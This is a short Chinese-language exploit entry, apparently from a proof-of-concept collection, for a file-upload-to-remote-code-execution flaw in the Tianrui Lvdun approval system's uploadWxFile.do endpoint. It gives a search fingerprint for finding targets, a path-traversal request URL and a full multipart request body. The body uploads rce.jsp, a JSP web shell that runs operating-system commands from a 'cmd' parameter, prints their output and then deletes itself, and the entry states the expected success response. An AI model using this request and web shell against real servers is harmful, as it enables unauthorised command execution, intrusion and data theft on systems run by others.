# 天锐绿盾审批系统uploadWxFile.do存在文件上传致RCE漏洞

- **系统**：天锐绿盾　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="TIPPAY-绿盾审批系统"`
- **请求**：`POST /trwfe/service/.%2E/config/uploadWxFile.do HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTqkdY1lC…`

**请求体 / payload**
```
------WebKitFormBoundaryaKljzbg49Mq4ggLz
Content-Disposition: form-data; name="file"; filename="rce.jsp"
Content-Type: application/octet-stream
<% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundaryaKljzbg49Mq4ggLz--
回显必须是true，文件会上传到根目录
```
- **预期**：200　|　—